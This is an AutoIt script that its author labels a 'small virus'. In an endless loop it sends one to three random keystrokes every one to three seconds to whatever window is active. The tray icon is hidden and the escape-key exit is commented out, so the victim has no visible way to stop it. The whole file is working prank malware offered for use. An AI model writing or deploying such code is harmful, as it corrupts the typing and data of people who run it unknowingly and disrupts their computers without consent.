#cs ----------------------------------------------------------------------------

 AutoIt Version: 3.3.14.5
 Author:         Brain4Tech

 Script Function:
	A small virus which randomly simulates keyboard presses

#ce ----------------------------------------------------------------------------

; Script Start - Add your code below here

#NoTrayIcon
;HotKeySet("{ESC}", "_exit")

;Define min and max value for waitung time (seconds)
$iRandomSleepMin = 1
$iRandomSleepMax = 3
$iRandomSleepInterval = 1

;Define min and max value for amount of letters (int)
$iRandomCharCountMin = 1
$iRandomCharCountMax = 3

;Define min and max ASCII-value for simulating
$iRandomASCIIMin = 32
$iRandomASCIIMax = 127

;Sleep (30000)

While True

	$iRandomSleepCount = Random ($iRandomSleepMin * 1000, $iRandomSleepMax * 1000, $iRandomSleepInterval * 1000)

	Sleep ($iRandomSleepCount)

	$iRandomCharCount = Random ($iRandomCharCountMin, $iRandomCharCountMax)

	For $i = 0 To $iRandomCharCount -1 Step 1
		$chrRandomChar = _GetRandomChar ($iRandomASCIIMin, $iRandomASCIIMax)
		Send ($chrRandomChar)
	Next

WEnd

Func _GetRandomChar ($iMin, $iMax)

	$iRandomASCII = Random ($iMin, $iMax)
	$chrASCII = Chr($iRandomASCII)

	Return $chrASCII

EndFunc

Func _exit()
	Exit
EndFunc
















